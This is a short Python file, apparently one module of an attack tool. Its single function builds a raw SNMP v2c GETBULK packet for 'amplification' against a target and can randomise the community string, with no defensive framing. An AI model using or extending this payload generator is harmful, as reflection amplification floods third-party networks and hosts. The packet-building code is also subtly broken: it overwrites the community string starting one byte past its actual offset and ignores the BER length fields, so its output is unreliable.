import random

def generate_payload(target, options=None):
    """
    SNMP v2c GETBULK amplification, supports community mutation
    options:
      - community: str, community string
      - mutate: bool, whether to mutate
    """
    community = options.get('community', 'public') if options else 'public'
    mutate = options.get('mutate', False) if options else False
    if mutate:
        community = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(4,8)))
    # Only replace community part
    base = bytearray(b'\x30\x26\x02\x01\x01\x04\x06public\xa5\x19\x02\x04\x71\x5c\x3b\x0b\x02\x01\x00\x02\x01\x0a\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00')
    base[8:8+len(community)] = community.encode()[:8]
    return bytes(base)